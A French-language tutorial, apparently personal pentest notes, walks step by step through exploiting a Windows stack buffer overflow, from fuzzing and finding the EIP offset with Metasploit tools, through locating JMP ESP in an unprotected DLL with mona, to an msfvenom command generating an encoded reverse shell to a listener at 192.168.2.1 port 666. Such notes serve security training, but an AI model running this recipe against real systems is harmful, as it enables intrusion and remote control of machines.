## Attaque Buffer-Overflow

Pour déterminer si un système est vulnérable, il faut d'un champ ou l'on rentre une valeur soit disponible comme une page de login en web ou une section mot de passe lors de l'authentification sur un serveur avec le protocole POP3.

pour tester cela, on doit ouvrir l'applicatif dans un débuggeur et écrire une grande quantité de A pour voir si un dépassement de la mémoire est faisable.

Une fois que nous sommes sûr que l'on peut faire un dépassement de mémoire, on doit déterminer l'offset pour atteindre l'EIP.

- Création d'un pattern d'une longueur de 800
```bash
/opt/metasploit/tools/exploit/pattern_create.rb -l 800 # pour Arch
msf-pattern_create -l 3000 # pour Kali
```
- Envoie du pattern dans la section vulnérable
- Lire la valeur de EIP dans le débuggeur lorsque le programme à planté
- Calcul de l'offset
```bash
/opt/metasploit/tools/exploit/pattern_offset.rb -l 800 -q <value EIP> # pour Arch
msf-pattern_offset -l 3000 -q 39694438 # pour Kali
```
- Vérifier que l'offset est correcte en écrivant  `offset * "A" + 4 * "B"` dans la section. La valeur de l'EIP doit être `42424242`
- vérifier la place dispo pour la Payload, envoyant dans la section `offset * "A" + 4 * "B" + 80 * "C"`. Les "C" doivent être écrit dans la mémoire.
- chercher une DLL qui n'est pas sécurisé(Rebase, ASLR : False)
```
!mona modules
```
- vérifier la présence d'une instruction dans une DLL et liste les adresses de où se trouve l'instruction JMPESP (l'opcode de JMPESP est `\xff\xe4` ) 
```
!mona find -s "\xff\xe4" -m slmfc.dll
```
- Création d'un reverse shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1  
LPORT=666 -f c -e x86/shikata_ga_nai -b "\x00\x0D\xFF"
```

 Paramètre | Valeur                    | Description            
 --------- | ------------------------- | ---------------------- 
 -p        | windows/shell_reverse_tcp | type de payload        
 LHOST     | 192.168.2.1               | adresse ip du listener 
 LPORT     | 666                       | port du listener       
 -f        | c                         | export au format C     
 -e        | x86/shikata_ga_nai        | encodeur               
 -b        | "\x00\x0D\xFF"            | liste des Badchar       

- Maintenant, créer l'exploit avec :
```
offset + Adresse de JMPESP(inversé) + nb * NoP + Shellcode
```
